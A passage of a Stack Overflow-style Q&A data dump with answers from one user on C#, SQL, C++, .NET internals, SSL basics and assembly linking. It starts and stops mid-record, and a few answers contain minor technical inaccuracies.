<p>This way, you haven't changed anything in <em>the</em> <code>main</code>. :-p</p>
"
"<p>I have two tables. Those tables have two relation between them. </p>

<pre><code>Table 1
   * ID_XPTO (PK)
   * Detail

Table 2
   * ID_XPTO (FK) (PK)
   * ID_XPTO2 (FK) (PK)
</code></pre>

<p>Those two relations exists.</p>

<pre><code>Table 1 -&lt; Table2 
Table 1 -&lt; Table2
</code></pre>

<p>My question is that I need to delete some row in table 1. I'm currently doing,</p>

<pre><code>declare @table Table (xptoTable2 int)
insert into @table
        select ID_XPTO2
        from Table2 
        where ID_XPTO = @ID_XPTO

delete from Table2
where ID_XPTO = @ID_XPTO

delete from Table
where ID_XPTO in (select xptoTable2from @table)
</code></pre>

<p>I know that I could use ON DELETE SET NULL on table2. On that way I could then search for all rows with null value on ID_XPTO2 and delete them, but DBA does not wants to use it.</p>

<p>Is there some better solution to do this process?</p>
","33708","Mehrdad","<p>Use <code>ON DELETE CASCADE</code>. It'll automatically <em>delete</em> referencing rows.</p>
"
"<p>The code below is looping through a dictionary of strings and <strong>IMyCompanySettings</strong> looking for values that implement <strong>IMyCompanyProductSetting</strong>. Clearly, trying to cast and raising an exception is a very expensive way to do this.</p>

<pre><code>    public static List&lt;IMyCompanyProductSetting&gt; GetProductSettings(ConfigurationManager cfm)
    {
        List&lt;IMyCompanyProductSetting&gt; ret = new List&lt;IMyCompanyProductSetting&gt;();
        foreach(IMyCompanySetting setting in cfm.Values)
        {
            try
            {
                IMyCompanyProductSetting prod = (IMyCompanyProductSetting)setting;
                ret.Add(prod);

            }
            catch
            {
              // Do nothing.
            }
        }
        return ret;
    }
</code></pre>

<p>What's a better way to do this?</p>
","33708","Mehrdad","<h2>Casting 101 [general info on casting stuff]:</h2>

<p>Use <code>[object] is [interface/class]</code> expression:</p>

<pre><code>if (setting is IMyCompanyProductSetting) {
  ...
}
</code></pre>

<p>Alternatively you can use the <code>as</code> keyword which tries to cast the object and if it fails, instead of throwing exception, it'll return <code>null</code>. Note that the target type must be a reference type in the <code>as</code> keyword:</p>

<pre><code>var prod = setting as IMyCompanyProductSetting; 

if (prod != null) {
   ...
}
</code></pre>

<p>You should always use the above code instead of the equivalent exception handling.</p>

<h2>Filtering an <code>IEnumerable</code> by type (LINQy):</h2>

<p>As Jon Skeet pointed out, you should use <code>OfType</code> extension method to filter a sequence easily (assuming you got LINQ):</p>

<pre><code>var filteredSequence = sequence.OfType&lt;TargetType&gt;();
</code></pre>

<h2>Casting an <code>IEnumerable</code> to type (LINQy):</h2>

<p>If you want to try casting each element to the target type (as opposed to filtering by type), you can use the <code>Cast</code> extension method:</p>

<pre><code>var castedSequence = sequence.Cast&lt;TargetType&gt;();
</code></pre>
"
"<p>This is a little subjective I think; I'm not sure if the opinion will be unanimous (I've seen a lot of code snippets where references are returned).</p>

<p>According to a comment toward <a href=""http://stackoverflow.com/questions/752479/am-i-initializing-my-c-reference-variables-correctly"">this question I just asked, regarding initializing references</a>, returning a reference can be evil because, [as I understand] it makes it easier to miss deleting it, which can lead to memory leaks.</p>

<p>This worries me, as I have followed examples (unless I'm imagining things) and done this in a fair few places... Have I misunderstood? Is it evil? If so, just how evil?</p>

<p>I feel that because of my mixed bag of pointers and references, combined with the fact that I'm new to C++, and total confusion over what to use when, my applications must be memory leak hell...</p>

<p>Also, I understand that using smart/shared pointers is generally accepted as the best way to avoid memory leaks, so thanks in advance for your tips ;)</p>
","33708","","<p>It's not evil. Like many things in C++, it's good if used correctly, but there are many pitfalls you should be aware of when using it (like returning a reference to a local variable).</p>

<p>There are good things that can be achieved with it (like map[name] = ""hello world"")</p>
"
"<p>I am curious to know if anyone has figured out a way to create the server portion of DRM in an open source manner while allowing for DRM clients to be closed. I understand that if the client were open source, it would be easy to remove the DRM checks, but I believe the server doesn't suffer from the same challenge.</p>
","33708","","<p>It is possible but like any DRM, it's broken by nature. ;)</p>
"
"<p>Going from a lambda to an Expression is easy using a method call...</p>

<pre><code>public void GimmeExpression(Expression&lt;Func&lt;T&gt;&gt; expression)
{
    ((MemberExpression)expression.Body).Member.Name; // ""DoStuff""
}

public void SomewhereElse()
{
    GimmeExpression(() =&gt; thing.DoStuff());
}
</code></pre>

<p>But I would like to turn the Func in to an expression, only in rare cases...</p>

<pre><code>public void ContainTheDanger(Func&lt;T&gt; dangerousCall)
{
    try 
    {
        dangerousCall();
    }
    catch (Exception e)
    {
        // This next line does not work...
        Expression&lt;Func&lt;T&gt;&gt; DangerousExpression = dangerousCall;
        var nameOfDanger = 
            ((MemberExpression)dangerousCall.Body).Member.Name;
        throw new DangerContainer(
            ""Danger manifested while "" + nameOfDanger, e);
    }
}

public void SomewhereElse()
{
    ContainTheDanger(() =&gt; thing.CrossTheStreams());
}
</code></pre>

<p>The line that does not work gives me the compile-time error <code>Cannot implicitly convert type 'System.Func&lt;T&gt;' to 'System.Linq.Expressions.Expression&lt;System.Func&lt;T&gt;&gt;'</code>. An explicit cast does not resolve the situation. Is there a facility to do this that I am overlooking?</p>
","33708","","<p>Ooh, it's not easy at all. <code>Func&lt;T&gt;</code> represents a generic <code>delegate</code> and not an expression. If there's any way you could do so (due to optimizations and other things done by the compiler, some data might be thrown away, so it might be impossible to get the original expression back), it'd be disassembling the IL on the fly and inferring the expression (which is by no means easy). Treating lambda expressions as data (<code>Expression&lt;Func&lt;T&gt;&gt;</code>) is a magic done by the <strong>compiler</strong> (basically the compiler builds an expression tree in code instead of compiling it to IL).</p>

<h3>Related fact</h3>

<p>This is why languages that push lambdas to the extreme (like Lisp) are often easier to implement as <strong>interpreters</strong>. In those languages, code and data are essentially the same thing (even at <em>run time</em>), but our chip cannot understand that form of code, so we have to emulate such a machine by building an interpreter on top of it that understands it (the choice made by Lisp like languages) or sacrificing the power (code will no longer be exactly equal to data) to some extent (the choice made by C#). In C#, the compiler gives the illusion of treating code as data by allowing lambdas to be interpreted as <strong>code</strong> (<code>Func&lt;T&gt;</code>) and <strong>data</strong> (<code>Expression&lt;Func&lt;T&gt;&gt;</code>) at <em>compile time</em>.</p>
"
"<p>C# provides functionality to submit a post request, but there is nothing about uploading an image/file on MSDN. I'd like to do this without using raw headers.</p>

<h3>Related questions</h3>

<p><a href=""http://stackoverflow.com/questions/566462/upload-files-with-httpwebrequest-multipart-form-data"">Upload files with HTTPWebrequest (multipart/form-data)</a></p>
","33708","","<p>You can use <code>WebClient</code> class easily. It has an <code>UploadFile</code> method:</p>

<pre><code>var client = new WebClient();
client.UploadFile(""http://server/upload.aspx"", @""C:\file.jpg"");
</code></pre>
"
"<p>I want to know how to save stack in array list?</p>
","33708","","<p>In C# 3.0, you'd do:</p>

<pre><code>var list = stack.ToList();  // Returns List&lt;T&gt;
</code></pre>
"
"<p>I have been programming in .NET for four years (mostly C#) and I use IDiposable extensively, but I am yet to find a need for a finaliser.  What are finalisers for?</p>
","33708","","<p>Finalizers are meant as a mechanism to release resources not controlled by garbage collector, like an unmanaged handle. While <code>Dispose</code> might do it, it isn't guaranteed that the consumer will call it.</p>
"
"<p>I have a assembly file and a c file compiled to .o files (start.o and main.o) and is trying to link them with ld. I'm using this command:</p>

<pre><code>ld -T link.ld -o kernel.bin start.o main.o
</code></pre>

<p>where link.ld is a linker script, but when I run it, i get this error:</p>

<pre><code>start.o:start.o:(.text+0x2d): undefined reference to `_main'
</code></pre>

<p>in the assembly file, I call the c file with this function:</p>

<pre><code>stublet:
extern _main
call _main

jmp $
</code></pre>

<p>Anybody can see what's wrong?</p>
","33708","","<p>Some compilers (like GCC for Linux) don't add <code>_</code> by default to C library exports. Try <code>nm main.o</code> to see the actual reference name. It might be <code>main</code> rather than <code>_main</code>.</p>
"
"<p>Quicksort has a worst-case performance of O(n<sup>2</sup>), but is still used widely in practice anyway.  Why is this?</p>
","33708","","<p>Average asymptotic order of QuickSort is <code>O(nlogn)</code> and it's usually more efficient than heapsort due to smaller constants (tighter loops). In fact, there is a theoretical linear time median selection algorithm that you can use to always find the best pivot, thus resulting a worst case <code>O(nlogn)</code>. However, the normal QuickSort is usually faster than this theoretical one.</p>

<p>To make it more sensible, consider the probability that QuickSort will finish in <code>O(n</code><sup><code>2</code></sup><code>)</code>. It's just <code>1/n!</code> which means it'll almost never encounter that bad case.</p>
"
"<p>I am currently developing a query builder application, basically a simple graphical interface that should allow users with no knowledge of SQL to define various queries on a database (joins, select, update, insert, delete). I will be using .Net 3.5. My application should support multiple databases, it should work with MS-SQL Server, MySQL and Oracle, so I would appreciate any hints or links to relevant lecture on <strong>how to design a provider independent DAL</strong>. </p>

<p>The user will select a database server, a database on the current server, provide the connection credentials, chose various tables, define queries (using a series of combo boxes) and finally execute the queries if they are valid. Of course, in the DAL I do want to have methods for each DB provider. I am thinking something on the lines of the factory pattern.  </p>

<p>Note: This is a simple school project, so I am not interested in security or performance of the resulting queries.</p>

<p><strong>UPDATE:</strong> After some more research and with the very valuable input that you have provided, I decided to use DbProviderFactory. ORM would be interesting but since I just want a query analyzer/builder I don't see the point of using one. So, I would appreciate if you would point me to a detailed tutorial on how to use DbProviderFactory and the associated classes.</p>
","33708","","<p>I think ADO.NET Entity Framework (available since .NET 3.5 SP1) is a great choice as it pretty much abstracts away database-dependent SQL with its entity SQL language.</p>
"
"<p>Say you have an object which, for the sake of example, we will call the ScoreHotChicksEngine. And say that the ScoreHotChicksEngine's constructor is expecting to be passed an IDataReader containing property values pertaining to, apparantly, Scoring Hot Chicks for Lonely Geeks.  </p>

<pre><code>ScoreChicksEngine(IDataReader reader);
</code></pre>

<p>Ok, here's what I would like to gather input on...</p>

<p>As a developer would you find it more useful to assume that the reader must be read before being passed into the ScoreChicksEngine</p>

<pre><code>IDataReader = command.ExecuteReader();
reader.Read();
ScoreChicksEngine SCE = new ScoreChicksEngine(reader);
</code></pre>

<p>or would you assume that the engine itself would call that function and possibly deal with the empty values? </p>

<pre><code>IDataReader  = command.ExecuteReader();
ScoreChicksEngine SCE = new ScoreChicksEngine(reader);
if (SCE.HasReaderData()) doSomething();
</code></pre>
","33708","","<p>I'd choose the first method. The second method violates single responsibility principle. I'd also declare the input parameter of the constructor as <code>IDataRecord</code> and not <code>IDataReader</code>. Basically the SCE class constructs itself based on a single record and doesn't care about a set of records out there.</p>
"
"<p>Is there an AppDomain for every C# program even if we do not specifically create an AppDomain? Why is it required? I have read about third party assemblies crashing the entire application if we do not load them into separate AppDomain. I didn't get that point well. Can anyone explain this also.</p>
","33708","","<p><code>AppDomain</code> is pretty much like a process, it's an infrastructure that your application runs in. A .NET assembly needs to be loaded in an <code>AppDomain</code> in order to be run. It's not required to load third party assemblies into separate <code>AppDomains</code>, but if you do, it provides isolation between them (like two separate processes) and malfunction in one will not affect the other. Application domains can be unloaded independently. </p>

<p>As an example, SQL Server use <code>AppDomain</code>s to load CLR assemblies safely in its process.</p>
"
"<p>I have a series of extension methods defined for various classes
in a C# library. I'm currently writing some F# code and instead of rewriting
that code I would simply like to use my existing extension methods in my F# code.</p>

<p>I have added a reference to the library and used the
open statement to import the namespace,
but the extension methods to not appear in F#</p>
","33708","","<h3>Update:</h3>

<p>In the current version of F#, you can simply consume extension methods by adding </p>

<pre><code>open TheNamespaceOfExtensionMethod
</code></pre>

<p>to your source file (just like you do in C# with a <code>using</code> directive) and simply call the extension method as if it was a normal instance method. </p>

<p>By the way, you can always call them directly just like a normal static method and pass the object reference as the first parameter without any directives if you want. An extension method is simply a static method decorated with <code>ExtensionAttribute</code> under the hood.</p>

<h3>Original answer (before F# 2010 beta; not true anymore, as Dykam points out):</h3>

<p>I don't think extension methods are supported by F#. You can always call them directly just like a normal static method and pass the object reference as the first parameter.</p>
"
"<p>In a static class, I have a method which will edit a variable. The class is static because the class is about site detaild and so only one instance is ever required.</p>

<p>Anyway, thread synchronisation is required. I have a lock object, but when I make it private it and say lock (obj){} I get all sorts of errors.</p>

<p>Why is not possible to make the lock object private?</p>
","33708","","<p>It should work. Are you declaring it as <code>private static</code>?</p>

<pre><code>private static readonly object lockObject = new object();

public static void Method() {
    lock(lockObject) { 
         // ...
    }
}
</code></pre>
"
"<p><br>
I was passing a test and met a question in which we didn't find an agreement with my colleagues.</p>

<p><strong>Ð¡++</strong></p>

<pre><code>  1 class Base {};
  2 class Derived : public Base {};
  3 class Foo
  4 {
  5 public:
  6     Foo()
  7     {
 -8-         Base* b = new Derived(); // Concept name is?
  9     }
 10 };
</code></pre>

<p><strong>C#</strong></p>

<pre><code>  1 abstract class Base{}
  2 public class Derived : Base{}
  3
  4 public class Foo
  5 {
  6    public Foo
  7    {
 -8-        Base b = new Derived(); // Concept name is?
  9    }
 10 }
</code></pre>

<p>The question is: line number 8 above is an example of the following oo concept</p>

<ol>
<li>Polymorphism</li>
<li>Aggregation</li>
<li>Encapsulation</li>
<li>Abstraction</li>
<li>Inheritance</li>
</ol>

<p>Please put a link with the answer to the source of knowledge.</p>

<p>P.S. The test is 'OO Concept' on breinbench. It is free.</p>

<p><strong>Update:<br></strong></p>

<p>From one of the answer which defends <strong>polymorphism</strong></p>

<blockquote>
  <p>""In simple terms, polymorphism is the
  ability of one type, A, to appear as
  and be used like another type, B. In
  strongly typed languages, this usually
  means that type A somehow derives from
  type B, or type A implements an
  interface that represents type B.""</p>
</blockquote>

<p>From wikipedia which defends <strong>inheritance</strong></p>

<blockquote>
  <p>Inheritance is also sometimes called
  generalization, because the <strong>is-a</strong>
  relationships represent a hierarchy
  between classes of objects.</p>
</blockquote>

<p>and </p>

<blockquote>
  <p>Inheritance therefore has another
  view, a dual, called polymorphism,
  which describes many pieces of code
  being controlled by shared control
  code.</p>
</blockquote>

<p>so <code>Base = new Derived()</code> shows 'is a'(<strong>inheritance</strong>). And consequence of this is <strong>polymorphism</strong>.</p>

<p>So I doubt what is right?</p>
","33708","","<p>This snippet is about <a href=""http://en.wikipedia.org./wiki/Inheritance_(computer_science)"" rel=""nofollow"">Inheritance</a></p>

<h3>A rough summary of concepts</h3>

<p><strong>Abstraction</strong> is about the whole idea of modeling a real-world concept in terms of objects rather than thinking about function calls or other stuff. It's basically thinking about objects as separate entities.</p>

<p><strong>Encapsulation</strong> is the act of hiding implementation of an object from the outside world behind well-defined interfaces.</p>

<blockquote>
  <p><strong>Inheritance</strong> is the relationship between derived classes and base classes and categorization of concepts. It defines ""is-a"" relationship between too entities, adding the ability of using derived classes where a base is expected.</p>
</blockquote>

<p><strong>Polymorphism</strong> means two objects are similar in interface but behave in different ways (think about <code>virtual</code> methods).</p>

<p><strong>Aggregation</strong> defines a ""has-a"" relationship between two concepts. Means an object is composed out of another entity.</p>
"
"<h3>Background</h3>

<p>I have a <code>DataGridView</code> control which I am using, and I added my handler below to the <code>DataGridView.CellFormatting</code> event so the values in some cells can be made more human-readable. This event handler has been working great, formatting all values without issue.</p>

<p>Recently however, I have discovered a very rare circumstance causes an unusual bug. The column in my <code>DataGridView</code> for the item's due date always has an <code>int</code> value. <code>0</code> indicates the event is never due, any other value is a UTC timestamp for the due date. The MySQL db column corresponding doesn't allow nulls. When the user has moved from one <code>DataGridView</code> row with a due date, to another <code>DataGridView</code> row with a due date (at this point everything is still appears fine), and then presses a button which reloads the data from the database (without sending updates, essentially calling <code>DataAdapter.Fill()</code>), the program generates a <code>StackOverflowException</code>**.</p>

<h3>No recursion?</h3>

<p>What is so unusual to me is that I do not see where the recursion or infinte-looping is. I added <code>int cellFormatCallCount</code> as a class member, and increment it during each call, but at the time the exception is thrown, the debugger shows the value of that <code>int</code> as 1, which I would expect since I wasn't under the impression and recursion was occuring.</p>

<p>Can somebody help me?</p>

<p>How can I view a stack trace? In VS2008 it says:
<code>{Cannot evaluate expression because the current thread is in a stack overflow state.}</code></p>

<p>Best regards, </p>

<p>Robinson</p>

<pre><code>private int cellFormatCallCount = 0;
private void myDataGridView_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)  {
    try {
        // to format the cell, we will need to know its value and which column its in
        string value = """";
        string column = """";

        // the event is sometimes called where the value property is null
        if (e.Value != null) {
            cellFormatCallCount++; // here is my test for recursion, this class member will increment each call

            // This is the line that throws the StackOverflowException
            /* ********************* */
            value = e.Value.ToString();
            /* ********************* */

            column = actionsDataGridView.Columns[e.ColumnIndex].Name;
        } else {
            return; // null values cannont be formatted, so return
        }

        if (column == ""id"") {
            // different code for formatting each column
        } else if (column == ""title"") {
            // ...
        } else {
            // ...
        }
    } finally {
        cellFormatCallCount = 0; // after we are done with the formatting, reset our recursion counter
    }
}
</code></pre>
","33708","","<p>It's unrelated to the problem but you can actually have a <code>StackOverflowException</code> without recursion at all just with:</p>

<pre><code>throw new StackOverflowException();
</code></pre>
"
"<p>I have a variable size array of strings, and I am trying to programatically loop through the array and match all the rows in a table where the column ""Tags"" contains at least one of the strings in the array. Here is some pseudo code:</p>

<pre><code> IQueryable&lt;Songs&gt; allSongMatches = musicDb.Songs; // all rows in the table
</code></pre>

<p>I can easily query this table filtering on a fixed set of strings, like this:</p>

<pre><code> allSongMatches=allSongMatches.Where(SongsVar =&gt; SongsVar.Tags.Contains(""foo1"") || SongsVar.Tags.Contains(""foo2"") || SongsVar.Tags.Contains(""foo3""));
</code></pre>

<p>However, this does not work (I get the following error: ""A lambda expression with a statement body cannot be converted to an expression tree"")</p>

<pre><code> allSongMatches = allSongMatches.Where(SongsVar =&gt;
     {
       bool retVal = false;
       foreach(string str in strArray)
       {
         retVal = retVal || SongsVar.Tags.Contains(str);
       }
       return retVal;
     });
</code></pre>

<p>Can anybody show me the correct strategy to accomplish this? I am still new to the world of LINQ :-)</p>
","33708","","<p>You can use the <a href=""http://www.albahari.com/nutshell/predicatebuilder.aspx""><code>PredicateBuilder</code></a> class:</p>

<pre><code>var searchPredicate = PredicateBuilder.False&lt;Songs&gt;();

foreach(string str in strArray)
{
   var closureVariable = str; // See the link below for the reason
   searchPredicate = 
     searchPredicate.Or(SongsVar =&gt; SongsVar.Tags.Contains(closureVariable));
}

var allSongMatches = db.Songs.Where(searchPredicate);
</code></pre>

<p><a href=""http://stackoverflow.com/questions/658818/linqtosql-strange-behaviour/658840#658840"">http://stackoverflow.com/questions/658818/linqtosql-strange-behaviour/658840#658840</a></p>
"
"<p>I have the following string:</p>

<blockquote>
  <p>FirstName=John&amp;LastName=Doe&amp;City=London&amp;ConfirmationId=WXASL320330</p>
</blockquote>

<p>I want to extract the confirmationId from it.  I have done a split on it and passed in the &amp; character, but this returns ConfirmationId=WXASL320330 and I just WXASL320330.  What is the best way of doing this?</p>

<p>The string is actually part of a property called RawProcessorResult that PayPal returns.</p>
","33708","","<pre><code>input.Split('&amp;').Select(x =&gt; x.Split('=')).Single(x =&gt; x[0].Equals(""ConfirmationId""))[1]
</code></pre>
"
"<p>I roamed the site for this question using the search engine, and I don't think it's out there. If it is, apologies in advance and feel free to point me to it. </p>

<p>Here is my scenario: </p>

<p>I am setting up a web application, Moodle if anyone is familiar with it, with Apache, MySQL, and php on Windows. Moodle supports enabling SSL for login, but then reverts to regular http after login is established. This is running on an internal network with no connection to the outside world, so no Internet access through this network. All users who use the network have logins, however there are some generic guest type logins with certain restricted privilages. Currently the MySQL database is not encrypted.</p>

<p>My question is this: </p>

<p>If my users do an SSL login, and the system then reverts back to http for the remainder of their session, how vulnerable is the data that is transferred back and forth between the browser interface and the database?</p>

<p>I would perhaps prefer to have all the data encrypted, but I am not sure how bad the performance hit would be to do that, so any suggestions concerning that would be appreciated too. Although I will be extending the functionality in Moodle, I don't necessarily want to have to change it to encrypt everything if already does.</p>

<p>I am new to the world of IT security, and my DBA skills are rusty, so if you give me an answer, type slowly so I can understand! ;)</p>

<p>Thanks in advance!
Carvell</p>
","33708","","<p>All sensitive data should be encrypted when transferred over an insecure wire. If you just transfer login details over SSL, all your data is still vulnerable to eavesdropping.</p>
"
"<p>Sorry, if this sounds ignorant. Is it possible to SECURELY upload data from a Windows Forms app using an asp.net web service or some other method? If so, what is the general way of doing it?</p>

<p>I have never used web services before.</p>

<p>I have an IIS 6 server with .net 3.5 installed. I need to build this windows forms program, which will hold data in a local sql compact database. When the program has access to the internet, the user needs to be able to MOVE the local data to a database on the web server.</p>

<p>What ways can I go about doing this? Am I on the right track thinking about web services? I have also read a bit about Sync Framework, but I'm not sure if that is all that well suited for this.</p>

<p>Thanks for suggestions.</p>

<h3>EDIT</h3>

<p>I forgot to ask: Would WCF be a possible useful technology?</p>
","33708","","<p>Yes. Just secure the web service by SSL.</p>

<p>WCF can be a useful technology too. You might also want to consider SQL Server merge replication.</p>
"
"<p>Suppose I'm given an object and a string that holds a method name, how can I return a delegate to that method (of that method?) ?</p>

<p>Example:</p>

<pre><code>MyDelegate GetByName(ISomeObject obj, string methodName)
{
    ...
    return new MyDelegate(...);
}

ISomeObject someObject = ...;
MyDelegate myDelegate = GetByName(someObject, ""ToString"");

//myDelegate would be someObject.ToString
</code></pre>

<p>Thanks in advance.</p>

<p>One more thing -- I really don't want to use a switch statement even though it would work but be a ton of code.</p>
","33708","","<pre><code>static MyDelegate GetByName(object obj, string methodName)
{
    return () =&gt; obj.GetType().InvokeMember(methodName, 
        System.Reflection.BindingFlags.InvokeMethod, null, obj, null); 
}
</code></pre>
"
"<p>I am looking to start working on a personal site using C#.  I work as a web developer and have used VBScript previously and am using Coldfusion now at work.  I use Dreamweaver for development in these languages.</p>

<p>I have read a lot of people recommending that you should use a MS IDE to develop in .net and that C# is the way to go in terms of the language.  I would like to stick with Dreamweaver as I feel I would be taking on a bit too much to learn how to use a new IDE and a new language at the same time.  </p>

<p>Will using something like Visual Studio help with developing in .net so much that it is worth the effort of changing from Dreamweaver?
If so which IDE would be best to learn with?</p>

<p>If I choose to stick with Dreamweaver is there any recommendations you can make as to how to best setup Dreamweaver for easy development?</p>
","33708","","<p>I believe not. Dreamweaver is not a good tool for developing <em>code</em>. This is what you need in ASP.NET. You'll need debugging. You'll enjoy IntelliSense, and you can always open single files in Dreamweaver occasionally (which I doubt you would, anyway). </p>

<p>Grab <a href=""http://www.visualstudio.com/downloads/download-visual-studio-vs#d-express-web"" rel=""nofollow"">Visual Studio Express 2013 for Web</a> (which is free) and enjoy. It's a Windows app, like many other Windows apps! You don't need professional training to use it. </p>
"
"<p>Let say I got this function :</p>

<pre><code>void int Calculate(double[] array) {}
</code></pre>

<p>And in my main I got this array:</p>

<pre><code>double[,] myArray = new double[3,3];
</code></pre>

<p>How can I call Calculate(...) ?</p>

<p>I try (that's don't compile) : </p>

<pre><code>double[] mySingleArray = myArray[0];
</code></pre>

<p>What I want to avoid is unnecessary loop (for).</p>

<p>I declare a regular array, but if a jagged array or any other type of array works better, it's fine for me.</p>

<p>I use c# 3.5</p>
","33708","","<p>A jagged array works the way you want:</p>

<pre><code>double[][] jaggedArray = new double[][100];
for (int i = 0; i &lt; jaggedArray.Length; ++i)
    jaggedArray[i] = new double[100];

myFunction(jaggedArray[0]);
</code></pre>

<p>You can have different sizes for each array in this way.</p>
"
"<p>There's a SecureZeroMemory() function in WinAPI that is designed for erasing the memory used for storing passwords/encryption keys/similar stuff when the buffer is no longer needed. It differs from ZeroMemory() in that its call will not be optimized out by the compiler.</p>

<p>Is it really so necessary to erase the memory used for storing sensitive data? Does it really make the application more secure?</p>

<p>I understand that data could be written into swapfile or into hibernation file and that other processes could possibly read my program's memory. But the same could happen with the data when it is still in use. Why is <em>use, then erase</em> better than just <em>use</em>?</p>
","33708","","<p>It does. Hibernation file is not encrypted, for example. And if you don't securely clear the memory, you might end up with trouble. It's just a single example, though. You should always hold secret stuff in memory only as long as needed.</p>
"
"<p>I want to know how to work out the new co-ordinates for a point when rotated by an angle relative to another point.</p>

<p>I have a block arrow and want to rotate it by an angle theta relative to a point in the middle of the base of the arrow.</p>

<p>This is required to allow me to draw a polygon between 2 onscreen controls. I can't use and rotate an image.</p>

<p>From what I have considered so far what complicates the matter further is that the origin of a screen is in the top left hand corner.</p>
","33708","","<p>If you are using GDI+ to do that, you can use <code>Transform</code> methods of the <code>Graphics</code> object:</p>

<pre><code>graphics.TranslateTransform(point of origin);
graphics.RotateTransform(rotation angle);
</code></pre>

<p>Then draw the actual stuff.</p>
"
"<p>Assume I have a form with some disabled checkboxes because the user as logged in shouldn't be able to check them.  Where should I add some sanitization security to make sure they didn't hack the checkbox and cause a postback?</p>

<p>In the page?
Database layer?
In the database?</p>

<p>I realize it's most likely a pretty broad question.</p>

<p>thanks,
Mark</p>
","33708","","<p>ASP.NET Event validation mechanism takes care of that. It's been there since 2.0, I think.</p>
"
"<p>In C#, if a class <em>has all the correct methods/signatures for an Interface</em>, but <strong>doesn't</strong> explicitly implement it like:</p>

<pre><code>class foo : IDoo {}
</code></pre>

<p>Can the class still be cast as that interface?</p>
","33708","","<p>No, it's not like Objective-C and some other languages. You should explicitly declare interface implementation.</p>
"
"<p>I filled several list&lt;> with default values, stuck them into a struct then pass the struct into several threads. Each thread has a different range so thread 1 would access list[0 to 199]  thread 2 would access [200 - 400] etc. Would i need a lock? and when do i need it? i can access the list with my multiple threads w/o using a lock. But if my main thread wants to <em>read</em> the data in the list (never write) do i need a lock for that? i'm sure i dont but i would like to ask before implementation.</p>

<p>-edit-</p>

<p>Thanks guys, you answered my question. (I will accept one later as long as someone doesnt disprove current answers)</p>
","33708","","<p>If you're not modifying the collection, you won't need locking at all.</p>

<p>If you want to modify the collection with one of the threads, you might want to look at the <a href=""http://msdn.microsoft.com/en-us/library/system.threading.readerwriterlock.aspx"">ReaderWriterLock</a>.</p>

<p>Peter's comment is a notable one. As also noted by the MSDN link above, you should consider using <a href=""http://msdn.microsoft.com/en-us/library/system.threading.readerwriterlockslim.aspx"">ReaderWriterLockSlim</a> class if you're on .NET 3.5. The idea is the same, nevertheless.</p>
"
"<p>I was wandering why when I create console application and 'transform' the main method to look identically with main method auto-generated when creating windows forms project, the console still appears on the screen:</p>

<pre><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Globalization;
using System.Windows.Forms;

namespace Chapter16
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            Application.Run(new CultureTest());
        }
    }
}
</code></pre>

<p>This code is identical with the code located in Program.cs from windows forms application. The problem is that console still appears on the screen which is not the case in windows forms project. Why is that?</p>

<p>Kind Regadrs
PK</p>
","33708","","<p>You should set the target type in project properties to ""Windows Application"". This is equivalent to <code>/target:winexe</code> compiler switch. It'll alter the <code>subsystem</code> in binary header to tell Windows not to open up a shell window.</p>
"
"<p>I get very confused when it comes up to byte conversation.</p>

<p>I need to do two convertions:</p>

<p>1.We have a byte[] array { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35 };</p>

<p>How do I convert it to string so I get ""30 31 32 33 34 35"".</p>

<p>2.We have the same byte[] array</p>

<p>Now I need to convert it to ASCII(0x30 = 0, 0x31 = 1, 0x32 = 2 and so on)</p>

<p>When done I should get ""012345"".</p>

<p>How do I make both convertions?</p>
","33708","","<pre><code>var bytearr = new byte[] { 0x30, 0x31, 0x32, 0x33, 0x34, 0x35 };
var str = bytearr.Select(x =&gt; x.ToString(""x2""));
var ascii = bytearr.Select(x =&gt; (char)x);
</code></pre>

<p>If you want the output as a single <code>string</code> (as opposed to <code>IEnumerable</code>s), you could do:</p>

<pre><code>var str = String.Join("" "", bytearr.Select(x =&gt; x.ToString(""x2"")).ToArray());
var ascii = new string(bytearr.Select(x =&gt; (char)x).ToArray());
</code></pre>
"
"<p>Please help me understand how the process goes. I understand that web browsers contain root certificates for certificate authorities (CAs) like verisign, Entrust, Comodo .. etc, but what exactly happens when a user accesses a secure page? Does the web browser send a request to the server of the CA to verify the ceriticate or it just uses the CA's root certificate (in the browser) to verify the certificate?</p>

<p>I used some HTTP sniffer and logged on to  gmail (the login page is secure) but didn't see requests going to any websites other than google, does that mean it only uses the CA's root certificate?</p>
","33708","","<p>CA signs the Web server certificate. Since the browser already has the CA public key (in root certificates), it can validate the authenticity of it without accessing CA. The only thing that requires CA access is to check if the certificate is revoked.</p>
"
"<p>If <code>actions</code> is a Panel, am I able to raise the <code>Click</code> event of it's parent?
I have this code at the moment, but the <code>Click</code> event isn't a method, so this code is invalid.<br />
Does anyone know how I can achieve this?</p>

<pre><code>actions.Click += delegate(object Sender, EventArgs e)
{
    ((Panel)Sender).Parent.Click();
}
</code></pre>
","33708","","<p>It's not possible to raise a C# <code>event</code> directly from another <code>class</code> (even if it's <code>public</code>). You could provide a method (with a sufficient access modifier) that raises the <code>event</code> on your behalf and call that method in the other <code>class</code>.</p>

<p>By the way, this is possible with reflection, but I consider that a dirty hack.</p>
"
"<p>We know that behind the scenes, the ASP.NET MVC framework will use reflection to determine  what controllers/actions are available to be executed, based on which classes derive from <code>System.Web.Mvc.Controller</code> and, of those classes, which methods return an <code>ActionResult</code> object.</p>

<p>To my question - is it possible to access this list of controllers/actions from within my MVC application?</p>

<p>(I could do it myself, by using reflection on the current assembly, but if the list has already been built by ASP.NET MVC, I'd rather re-use that effort than re-invent the wheel myself.)</p>
","33708","","<p>This is done in an <code>internal</code> class in the <code>System.Web.Mvc</code> assembly called <code>System.Web.Mvc.ControllerTypeCache</code>.</p>

<p>By the way, action methods are not required to return <code>ActionResult</code>. They can return <code>void</code> happily, for instance.</p>
"
"<p>I have written a function nabs in assembly file math.nasm 
as follows</p>

<pre><code>%ifdef USE_x86_ASM
SECTION .text

    cglobal nABS
;*------------------------*
;* int nABS(int a)        * 
;* return value in eax    * 
;*------------------------*
ALIGN 16
    nABS:
        push ebx
        ......
                ......
                 pop ebx        
        ret
%endif
</code></pre>

<p>I am calling this function from c function func1 in file myfunc.c<br>
I am using nasm assembler for assembly file I am using X-code 3.1 version and gcc 4.0   compiler I have defined USE_x86_ASM  </p>

